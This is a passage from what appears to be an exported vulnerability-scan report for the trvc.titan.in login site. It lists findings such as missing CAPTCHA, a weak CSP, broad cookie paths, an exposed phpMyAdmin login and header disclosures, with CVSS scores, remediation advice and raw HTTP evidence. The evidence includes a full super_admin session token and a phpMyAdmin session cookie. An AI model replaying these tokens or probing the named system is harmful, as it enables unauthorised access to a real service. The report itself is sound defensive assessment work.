+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers","HTTP/2 200 OK
+Cache-Control: no-cache, no-store, must-revalidate
+Pragma: no-cache
+Allow: OPTIONS, TRACE, GET, HEAD, POST
+Public: OPTIONS, TRACE, GET, HEAD, POST
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Mon, 28 Sep 2026 11:12:16 GMT
+Content-Length: 0",https://trvc.titan.in/login,https://trvc.titan.in/login,"An attacker may use the enabled OPTIONS method to identify HTTP methods supported by the application, which can assist in further reconnaissance and vulnerability assessment. Although no direct unauthorized access was demonstrated from this finding alone, unnecessary HTTP methods may increase the application's attack surface."
+18,5588608,No CAPTCHA on login page,29-09-2026 05:30,29-09-2026 05:30,NEW,Medium,https://trvc.titan.in/login,It was observed that the application's login page does not implement a CAPTCHA mechanism to prevent automated authentication attempts.,"The login page does not implement CAPTCHA verification during authentication attempts. Without CAPTCHA, the application is vulnerable to automated attacks such as brute-force or credential stuffing, where attackers use automated scripts to guess valid username and password combinations. This significantly increases the risk of unauthorized access and account compromise.","Introduce CAPTCHA or equivalent challenge-response controls after repeated failed logins, and combine them with rate limiting, account lockout, or MFA for layered anti-automation protection.
+Implement CAPTCHA or an equivalent bot-detection mechanism on the login functionality.
+Apply CAPTCHA after multiple failed login attempts or when suspicious automated activity is detected.
+Implement server-side rate limiting for authentication requests.
+Maintain account lockout or progressive delays for repeated failed login attempts.
+Monitor and alert on abnormal login activity and repeated authentication failures.",,5.3,AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N,Improper Restriction of Excessive Authentication Attempts,A07:2025 - Authentication Failures,"GET /login HTTP/2
+Host: trvc.titan.in
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive","HTTP/2 200 OK
+Cache-Control: no-cache,no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Type: text/html
+Last-Modified: Wed, 09 Sep 2026 07:19:38 GMT
+Accept-Ranges: bytes
+Etag: ""0a1b3922b40dd1:0""
+Vary: Accept-Encoding
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Mon, 28 Sep 2026 11:11:02 GMT
+Content-Length: 10897",https://trvc.titan.in/login,https://trvc.titan.in/login,"An attacker may automate large numbers of login attempts against valid or targeted accounts, increasing the risk of brute-force and credential-stuffing attacks. If valid credentials are obtained, an attacker could gain unauthorized access to user accounts and the application functionality available to those accounts."
+19,5588607,Unset/Insecure CSP Header Vulnerability,29-09-2026 05:30,29-09-2026 05:30,NEW,Medium,https://trvc.titan.in/login,It was observed that the application's Content Security Policy (CSP) was not securely configured and allowed unsafe directives such as unsafe-inline and unnecessary development endpoints.,"The Content Security Policy (CSP) header is an HTTP header that allows web developers to control resources the user agent is allowed to load for a given page. When this header is missing, the browser does not have any restrictions on the sources of content, which can lead to Cross-Site Scripting (XSS), Clickjacking and Data Injection.","Recommendation: Implement a strict CSP policy with at least the following: ""default-src 'self'""; ""script-src 'self' 'nonce-random'""; ""object-src 'none'""; ""base-uri 'none'""; ""frame-ancestors 'none'""; ""style-src 'self'""; ""img-src 'self'""; ""connect-src 'self'""; ""form-action 'self'"".
+Remove unsafe-inline and unsafe-eval where they are not required.
+Use CSP nonces or hashes for required inline scripts.
+Remove unnecessary localhost/development endpoints from the production CSP.
+Use HTTPS for permitted external resources.
+Restrict connect-src to only trusted and required production endpoints.",.,5.3,AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N,Improper Restriction of Rendered UI Layers or Frames,A02:2025 - Security Misconfiguration,"GET /login HTTP/2
+Host: trvc.titan.in
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive","HTTP/2 200 OK
+Cache-Control: no-cache,no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Type: text/html
+Last-Modified: Wed, 09 Sep 2026 07:19:38 GMT
+Accept-Ranges: bytes
+Etag: ""0a1b3922b40dd1:0""
+Vary: Accept-Encoding
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Mon, 28 Sep 2026 11:11:02 GMT
+Content-Length: 10897",https://trvc.titan.in/login,https://trvc.titan.in/login,"An attacker who is able to exploit another client-side vulnerability may have a higher chance of executing unauthorized scripts because the CSP provides weaker restrictions. This may increase the impact of XSS or other client-side attacks, although the CSP misconfiguration alone does not directly provide unauthorized access."
+20,5588606,Overly Broad Cookie Path Detected,29-09-2026 05:30,29-09-2026 05:30,NEW,Low,https://trvc.titan.in/api/login,"It was observed that the session authentication cookie was configured with the root path (/), allowing it to be sent with requests to all application paths.","The cookie 'path' attribute signifies the URL or path for which the cookie is valid. If an overly broad path like root '/' is specified in the cookie then it is accessible through other applications on the same domain. Exposing the cookie to all web applications on the domain can lead to sensitive information disclosure like session identifier, etc. and can cause one application to compromise another application.","It is suggested that 'path' cookie attributes must be properly set in an environment where subdomains and subfolders host different applications.
+Configure the authentication/session cookie with the narrowest possible Path value required by the application instead of /. For example, if the cookie is only required under /login or a specific application path, restrict it accordingly. Continue using Secure, HttpOnly, and an appropriate SameSite attribute.",.,3.1,AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N,Configuration,A02:2025 - Security Misconfiguration,"POST /api/login HTTP/2
+Host: trvc.titan.in
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://trvc.titan.in/login
+Content-Type: application/json
+X-E2ee-Client: true
+Content-Length: 211
+Origin: https://trvc.titan.in
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers","HTTP/2 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""ef-QIyYn8qKO7Cg4a2nSaJQ7Wp0pbY""
+Vary: Origin
+Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MzE4NjI3OTc2M30.qIPTGy8saFZI50giVzSuSGozqp22ikMT_ufqmh7QK5Q; Path=/; HttpOnly; Secure; SameSite=Strict
+X-Request-Id: 1dd3f0b8-4ae0-4e8c-b6a7-4b10e38a0c58
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Origin: https://trvc.titan.in
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 20;w=900
+Ratelimit-Limit: 20
+Ratelimit-Remaining: 19
+Ratelimit-Reset: 900
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Mon, 28 Sep 2026 11:17:59 GMT
+Content-Length: 239",https://trvc.titan.in/api/login,https://trvc.titan.in/api/login,An attacker who is able to exploit another vulnerability within the application may potentially access or leverage the session cookie in application paths where it is not required. This can increase the attack surface for session-related attacks and may contribute to unauthorized session use if combined with another vulnerability.
+21,5588605,Sensitive HTML Form Fields With auto-complete Enabled,29-09-2026 05:30,29-09-2026 05:30,NEW,Low,https://trvc.titan.in/login,"It was observed that the password field has autocomplete enabled, which may allow browsers to store and automatically populate sensitive authentication information.","The Web form contains passwords or other sensitive text fields for which the browser auto-complete feature is enabled. 
+   Auto-complete stores completed form field and passwords locally in the browser, so that these fields are filled 
+   automatically when the user visits the site again.
+	
+   
+Sensitive data and passwords can be stolen if the user's system is compromised.
+	
+   
+Note, however, that form auto-complete is a non-standard, browser-side feature that each browser handles differently. 
+   Opera, for example, disregards the feature, requiring the user to enter credentials for each Web site visit.","Disable autocomplete for all sensitive fields. 
+
+For each sensitive field in the HTML, set the ""autocomplete"" 
+         attribute to ""off"". For example:
+<pre>
+            <input type=""password"" autocomplete=""off"" name=""pw"">
+         </pre>
+If there are many fields, it may be faster to set the ""autocomplete"" attribute
+         to ""off"" in the outer <form> tag. For example:
+<pre>
+            <form action=""/login.jsp"" autocomplete=""off"" name=""pw"">
+               <input type=""password"" name=""pw"">
+            </form>
+         </pre>
+
+Review whether password autocomplete is required for the application's security requirements.
+For sensitive authentication scenarios where browser storage is not desired, configure the password field appropriately to discourage credential retention.
+Avoid storing passwords in application-side storage, cookies, or client-side JavaScript.
+Apply appropriate endpoint and browser security controls, particularly on shared or sensitive systems.",.,3.3,AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N,Information Exposure,A02:2025 - Security Misconfiguration,"GET /login HTTP/2
+Host: trvc.titan.in
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive","HTTP/2 200 OK
+Cache-Control: no-cache,no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Type: text/html
+Last-Modified: Wed, 09 Sep 2026 07:19:38 GMT
+Accept-Ranges: bytes
+Etag: ""0a1b3922b40dd1:0""
+Vary: Accept-Encoding
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Mon, 28 Sep 2026 11:11:02 GMT
+Content-Length: 10897",https://trvc.titan.in/login,https://trvc.titan.in/login,"An attacker with access to the user's browser profile or device may potentially retrieve or misuse stored authentication credentials, depending on the browser, password-manager configuration, and device security. This increases the risk of credential exposure on shared or compromised devices."
+22,5589049,Sensitive HTML Form Fields With auto-complete Enabled,30-09-2026 13:48,30-09-2026 13:48,NEW,Low,http://trvc.titan.in/index.php,"Sensitive HTML form fields are configured without restrictive autocomplete controls. Browser autofill may persist or replay credentials/PII on shared or compromised endpoints, increasing the risk of unauthorized disclosure and account takeover via locally stored form data. Evidence: &lt;input id=&quot;input_password&quot; name=&quot;pma_password&quot; type=&quot;password&quot; autocomplete=&quot;current-password&quot;&gt;",,,,3.1,CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N,,,"GET /index.php HTTP/1.1 
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Sec-Fetch-Dest:document
+Sec-Fetch-Mode:navigate
+Sec-Fetch-Site:none
+Sec-Fetch-User:?1
+Upgrade-Insecure-Requests:1
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+Host:trvc.titan.in","HTTP/1.1 200 OK 
+cache-control:no-store, no-cache, must-revalidate, pre-check=0, post-check=0, max-age=0
+pragma:no-cache
+content-type:text/html; charset=utf-8
+content-encoding:gzip
+expires:Wed, 30 Sep 2026 08:18:38 +0000
+last-modified:Wed, 30 Sep 2026 08:18:38 +0000
+vary:Accept-Encoding
+server:Microsoft-IIS/10.0
+x-powered-by:PHP/8.5.10
+set-cookie"":[""pma_lang=en; expires=Fri, 30 Oct 2026 08:18:33 GMT; Max-Age=2592000; path=/; HttpOnly; SameSite=Strict
+phpMyAdmin=1e4a3a54bb4794cacf9ee5853ccbde77; path=/; HttpOnly; SameSite=Strict""],""x-ob_mode:1
+x-frame-options:DENY
+referrer-policy:same-origin
+content-security-policy:default-src 'self' ;script-src 'self' 'unsafe-inline' 'unsafe-eval' ;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+x-content-security-policy:default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+x-webkit-csp:default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+x-xss-protection:1; mode=block
+x-content-type-options:nosniff
+x-permitted-cross-domain-policies:none
+x-robots-tag:noindex, nofollow
+date:Wed, 30 Sep 2026 08:18:38 GMT
+connection:close
+content-length:4550",http://trvc.titan.in/index.php,,"An attacker with access to the user's browser profile or device may potentially retrieve or misuse stored authentication credentials, depending on the browser, password-manager configuration, and device security. This increases the risk of credential exposure on shared or compromised devices."
+23,5589048,Overly Broad Cookie Path Detected,30-09-2026 13:48,30-09-2026 13:48,NEW,Low,http://trvc.titan.in/index.php,"Cookie Path is missing or overly broad (e.g. default /): pma_lang=en; expires=Fri, 30 Oct 2026 08:18:33 GMT; Max-Age=2592000; path=/; HttpOnly; SameSite=Strict | phpMyAdmin=1e4a3a54bb4794cacf9ee5853ccbde77; path=/; HttpOnly; SameSite=Strict. Impact: A Path of &quot;/&quot; (or missing Path) makes the cookie available site-wide; combined with other flaws this widens where the token is sent (defense-in-depth).",,,,3.1,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N,,,"GET /index.php HTTP/1.1 
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Sec-Fetch-Dest:document
+Sec-Fetch-Mode:navigate
+Sec-Fetch-Site:none
+Sec-Fetch-User:?1
+Upgrade-Insecure-Requests:1
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+Host:trvc.titan.in","HTTP/1.1 200 OK 
+cache-control:no-store, no-cache, must-revalidate, pre-check=0, post-check=0, max-age=0
+pragma:no-cache
+content-type:text/html; charset=utf-8
+content-encoding:gzip
+expires:Wed, 30 Sep 2026 08:18:38 +0000
+last-modified:Wed, 30 Sep 2026 08:18:38 +0000
+vary:Accept-Encoding
+server:Microsoft-IIS/10.0
+x-powered-by:PHP/8.5.10
+set-cookie"":[""pma_lang=en; expires=Fri, 30 Oct 2026 08:18:33 GMT; Max-Age=2592000; path=/; HttpOnly; SameSite=Strict
+phpMyAdmin=1e4a3a54bb4794cacf9ee5853ccbde77; path=/; HttpOnly; SameSite=Strict""],""x-ob_mode:1
+x-frame-options:DENY
+referrer-policy:same-origin
+content-security-policy:default-src 'self' ;script-src 'self' 'unsafe-inline' 'unsafe-eval' ;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+x-content-security-policy:default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+x-webkit-csp:default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+x-xss-protection:1; mode=block
+x-content-type-options:nosniff
+x-permitted-cross-domain-policies:none
+x-robots-tag:noindex, nofollow
+date:Wed, 30 Sep 2026 08:18:38 GMT
+connection:close
+content-length:4550",http://trvc.titan.in/index.php,,An attacker who is able to exploit another vulnerability within the application may potentially access or leverage the session cookie in application paths where it is not required. This can increase the attack surface for session-related attacks and may contribute to unauthorized session use if combined with another vulnerability
+24,5582952,Web Server Info Disclosure,22-09-2026 12:24,30-09-2026 12:24,OPEN,Info,https://trvc.titan.in/api/login,"Web server information disclosed in Server header: Microsoft-HTTPAPI/2.0; Impact: Exposed server or software information allows attackers to identify known vulnerabilities (CVEs), reduce reconnaissance effort, and perform targeted exploitation.",,,PROPFIND,0,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N,,,"PROPFIND /api/login HTTP/1.1 
+Accept:application/json, text/plain, */*
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Content-Type:application/json
+Referer:https://trvc.titan.in/login
+Sec-Fetch-Dest:empty
+Sec-Fetch-Mode:cors
+Sec-Fetch-Site:same-origin
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+sec-ch-ua:""Not;A=Brand"";v=""24"", ""Chromium"";v=""128""
+sec-ch-ua-mobile:?0
+sec-ch-ua-platform:""Linux""
+x-e2ee-client:true
+host:
+content-length"":0,""Host:trvc.titan.in","HTTP/1.1 404 Not Found 
+content-type:text/html; charset=us-ascii
+server:Microsoft-HTTPAPI/2.0
+date:Wed, 30 Sep 2026 06:54:47 GMT
+connection:close
+content-length:315",https://trvc.titan.in/api/login,,"An attacker can use the disclosed server technology information to perform targeted reconnaissance and identify potential vulnerabilities associated with the exposed web server. While the disclosure alone does not provide direct access to application data, it can assist in planning further attacks when combined with other vulnerabilities."
+25,5582904,Internal IP Address/Hostname Exposure,22-09-2026 11:43,30-09-2026 12:17,OPEN,Low,https://trvc.titan.in/login?Submit=Submit,Internal hostname exposed: localhost:3001,,,,5.3,AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N,,,"GET /login?Submit=Submit HTTP/1.1 
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Referer:https://trvc.titan.in/login
+Sec-Fetch-Dest:document
+Sec-Fetch-Mode:navigate
+Sec-Fetch-Site:same-origin
+Sec-Fetch-User:?1
+Upgrade-Insecure-Requests:1
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+Host:trvc.titan.in","HTTP/1.1 200 OK 
+cache-control:no-cache,no-cache, no-store, must-revalidate
+pragma:no-cache
+content-type:text/html
+content-encoding:gzip
+last-modified:Wed, 09 Sep 2026 07:19:38 GMT
+accept-ranges:bytes
+etag:""0a1b3922b40dd1:0""
+vary:Accept-Encoding
+strict-transport-security:max-age=31536000; includeSubDomains; preload
+content-security-policy:default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+x-frame-options:DENY
+x-content-type-options:nosniff
+referrer-policy:strict-origin-when-cross-origin
+permissions-policy:camera=(), microphone=(), geolocation=(), payment=()
+server:
+date:Wed, 30 Sep 2026 06:47:21 GMT
+connection:close
+content-length:1762",https://trvc.titan.in/login?Submit=Submit,,"An attacker can use the disclosed internal IP address and infrastructure information to gather details about the application's internal network architecture. This information may assist in identifying internal services or infrastructure that could be targeted during further reconnaissance and exploitation activities.
+"
+26,5585754,Internal IP Address/Hostname Exposure,25-09-2026 15:49,30-09-2026 12:16,OPEN,Low,https://trvc.titan.in/libs/,Internal hostname exposed: localhost:3001,,,,5.3,AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N,,,"GET /libs/ HTTP/1.1 
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Sec-Fetch-Dest:document
+Sec-Fetch-Mode:navigate
+Sec-Fetch-Site:none
+Sec-Fetch-User:?1
+Upgrade-Insecure-Requests:1
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+Host:trvc.titan.in","HTTP/1.1 200 OK 
+cache-control:no-cache,no-cache, no-store, must-revalidate
+pragma:no-cache
+content-type:text/html
+content-encoding:gzip
+last-modified:Wed, 09 Sep 2026 07:19:38 GMT
+accept-ranges:bytes
+etag:""0a1b3922b40dd1:0""
+vary:Accept-Encoding
+strict-transport-security:max-age=31536000; includeSubDomains; preload
